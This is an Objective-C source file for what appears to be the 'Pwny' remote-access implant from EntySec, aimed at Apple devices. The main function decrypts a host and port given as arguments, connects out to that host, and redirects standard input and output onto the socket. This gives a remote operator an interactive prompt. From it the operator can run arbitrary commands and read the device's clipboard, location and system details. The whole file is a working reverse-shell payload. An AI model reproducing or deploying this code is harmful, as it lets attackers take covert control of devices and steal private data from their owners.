/*
* MIT License
*
* Copyright (c) 2020-2021 EntySec
*
* Permission is hereby granted, free of charge, to any person obtaining a copy
* of this software and associated documentation files (the "Software"), to deal
* in the Software without restriction, including without limitation the rights
* to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
* copies of the Software, and to permit persons to whom the Software is
* furnished to do so, subject to the following conditions:
*
* The above copyright notice and this permission notice shall be included in all
* copies or substantial portions of the Software.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
* SOFTWARE.
*/

#import "crypto.h"

#import "pwny.h"
#import "console.h"
#import "utils.h"

void connectToServer(NSString *remote_host, int remote_port);

int main(int argc, const char *argv[]) {
    @autoreleasepool {
        if (argc < 3)
            return -1;
        else {
            NSMutableArray *args = [NSMutableArray array];
            for (int i = 0; i < argc; i++) {
                NSString *str = [[NSString alloc] initWithCString:argv[i] encoding:NSUTF8StringEncoding];
                [args addObject:str];
            }
            
            Crypto *crypto = [[Crypto alloc] init];

            NSString *remoteHost = [crypto crypto:args[1]];
            int remotePort = [[crypto crypto:args[2]] integerValue];

            connectToServer(remoteHost, remotePort);
        }
    }
    return 0;
}

void interactWithServer() {
    Pwny *pwny = [[Pwny alloc] init];
    Console *console = [[Console alloc] init];
    Utils *utils = [[Utils alloc] init];

    while (YES) {
        [console console_log:@"pwny% "];

        NSFileHandle *kbd = [NSFileHandle fileHandleWithStandardInput];
        NSData *inputData = [kbd availableData];

        NSString *command = [[NSString alloc] initWithData:inputData encoding:NSUTF8StringEncoding];
        command = [command stringByReplacingOccurrencesOfString:@"\n" withString:@""];

        if (![command length])
            continue;

        NSArray *args = [utils splitString:command];

        if ([args[0] isEqualToString:@"sysinfo"])
            [pwny cmd_sysinfo];
        else if ([args[0] isEqualToString:@"getpid"])
            [pwny cmd_getpid];
        else if ([args[0] isEqualToString:@"getpaste"])
            [pwny cmd_getpaste];
        else if ([args[0] isEqualToString:@"battery"])
            [pwny cmd_battery];
        else if ([args[0] isEqualToString:@"getvol"])
            [pwny cmd_getvol];
        else if ([args[0] isEqualToString:@"locate"])
            [pwny cmd_locate];
        else if ([args[0] isEqualToString:@"vibrate"])
            [pwny cmd_vibrate];
        else if ([args[0] isEqualToString:@"exec"]) {
            if ([args count] < 2)
                [console console_log:@"Usage: exec <command>\n"];
            else
                [pwny cmd_exec:args[1]];
        } else if ([args[0] isEqualToString:@"say"]) {
            if ([args count] < 2)
                [console console_log:@"Usage: say <message>\n"];
            else
                [pwny cmd_say:args[1]];
        } else if ([args[0] isEqualToString:@"setvol"]) {
            if ([args count] < 2)
                [console console_log:@"Usage: setvol <level>\n"];
            else {
                NSString *trimmedString = [args[1] stringByTrimmingCharactersInSet:[NSCharacterSet decimalDigitCharacterSet]];
                if (![trimmedString length])
                    [console console_log:@"Usage: setvol <level>\n"];
                else
                    [pwny cmd_setvol:args[1]];
            }
        } else if ([args[0] isEqualToString:@"exit"])
            break;
        else
            [console console_log:@"Unrecognized command!\n"];
    }
}

void connectToServer(NSString *remoteHost, int remotePort) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1)
        return;

    sockaddr_in hint;
    hint.sin_family = AF_INET;
    hint.sin_port = htons(remotePort);
    inet_pton(AF_INET, [remoteHost UTF8String], &hint.sin_addr);

    if (connect(sock, (struct sockaddr*)&hint, sizeof(hint)) == -1)
        return;

    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    interactWithServer();
    close(sock);
}
